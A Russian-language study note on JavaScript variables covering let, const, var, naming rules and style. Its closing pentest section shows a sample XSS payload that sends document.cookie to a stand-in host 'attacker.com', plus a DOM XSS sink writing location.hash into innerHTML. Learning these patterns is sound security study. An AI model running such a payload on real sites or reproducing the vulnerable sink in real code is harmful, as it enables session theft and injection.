# JS: Переменные

## 📌 Что это

Переменная — это «коробка» с именем, в которую можно положить данные и потом достать их по имени.

---

## 🛠️ Создание переменной

**Современный способ — `let`:**

```js
let A1234;              // создали переменную (пустую)
A1234 = 'hello!';       // положили в неё данные
alert(A1234);           // вывели данные → hello!
```

**Можно сразу с значением:**

```js
let name = 'wiener';
let age = 25;
```

---

## 🔄 Изменение значения

Значение переменной можно **перезаписать** — старое удалится:

```js
let A1234 = 'hey';      // создали со значением hey
A1234 = 'hello';        // заменили на hello
alert(A1234);           // hello
```

⚠️ **Повторное создание через `let` — ошибка:**

```js
let A1234 = 'hay';
let A1234 = 'hey!';     // ❌ SyntaxError
```

---

## 📋 Копирование значений

Можно копировать данные из одной переменной в другую:

```js
let world = 10;
let world2;
world2 = world;         // копируем 10 в world2
alert(world2);          // 10
```

---

## 🏷️ Правила имён переменных

**Разрешено:**
- Буквы (`a-z`, `A-Z`)
- Цифры (`0-9`)
- Символы `$` и `_`

**Запрещено:**
- Начинать с цифры (`1name` ❌)
- Использовать зарезервированные слова: `let`, `class`, `return`, `function` и др.

```js
let $ = 123;
let _ = 1;
alert($ + _);           // 124
```

---

## 🔒 `const` — неизменяемая переменная

Значение `const` **нельзя перезаписать**:

```js
const COLOR_RED = '#F00';
const COLOR_GREEN = '#0F0';

let color = COLOR_GREEN;
alert(color);           // #0F0

COLOR_GREEN = '#000';   // ❌ TypeError
```

**Когда использовать:** для констант — значений, которые не должны меняться (цвета, ключи API, лимиты).

---

## 📊 Сравнение `var`, `let`, `const`

| Ключевое слово | Когда использовать | Можно менять? | Область видимости |
|----------------|---------------------|---------------|-------------------|
| `var` | Устаревшее, не использовать | ✅ Да | Функция |
| `let` | Современный стандарт | ✅ Да | Блок `{}` |
| `const` | Для констант | ❌ Нет | Блок `{}` |

---

## 💡 Правила хорошего тона

1. **Имена — осмысленные.** `userName` лучше, чем `x`.
2. **camelCase** для обычных: `userName`, `totalPrice`.
3. **UPPER_SNAKE_CASE** для констант: `MAX_SIZE`, `API_KEY`.
4. **Не использовать `var`** в новом коде.
5. **`const` по умолчанию**, `let` — только если значение будет меняться.

---

## 🎯 Связь с пентестом

- В XSS-payload'ах переменные используются для хранения украденных данных:
  ```js
  let stolen = document.cookie;
  fetch('https://attacker.com', {method:'POST', body: stolen});
  ```
- В DOM XSS часто встречаются переменные, которые берут данные из URL:
  ```js
  let name = location.hash.substring(1);
  document.getElementById('greeting').innerHTML = name;  // ⚠️ уязвимо
  ```
